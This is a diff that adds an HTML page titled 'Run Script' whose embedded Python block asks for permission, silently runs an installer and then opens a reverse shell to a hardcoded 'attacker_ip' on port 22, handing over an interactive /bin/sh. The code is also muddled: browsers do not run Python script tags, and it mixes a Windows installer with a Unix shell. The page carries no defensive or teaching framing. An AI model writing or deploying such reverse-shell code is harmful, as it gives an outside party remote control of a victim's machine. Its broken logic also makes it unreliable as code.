@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Run Script</title>
+</head>
+<body>
+    <script type="text/python">
+        import subprocess
+        import socket
+        import os
+        import tkinter as tk
+        from tkinter import messagebox
+
+        def run_installer():
+            # Placeholder path for installer, modify this according to your actual installer path
+            installer_path = "C:/"
+            # Display a message box asking for permission to install
+            permission = messagebox.askyesno("Permission Required", "Do you want to install this program?")
+            if permission:
+                # If permission is granted, proceed with silent installation
+                subprocess.call([installer_path, "/S"])
+
+        def reverse_shell():
+            attacker_ip = "192.168.1.101"
+            attacker_port = 22
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((attacker_ip, attacker_port))
+            os.dup2(s.fileno(), 0)
+            os.dup2(s.fileno(), 1)
+            os.dup2(s.fileno(), 2)
+            subprocess.call(["/bin/sh", "-i"])
+
+        def main():
+            # Create a Tkinter window for permission request
+            root = tk.Tk()
+            root.withdraw()  # Hide the root window
+
+            # Display permission request window
+            permission = messagebox.askyesno("Permission Required", "Do you want to allow this program to run?")
+            if permission:
+                # If permission is granted, proceed with installation and reverse shell
+                run_installer()
+                reverse_shell()
+
+        if __name__ == "__main__":
+            main()
+    </script>
+</body>
+</html>
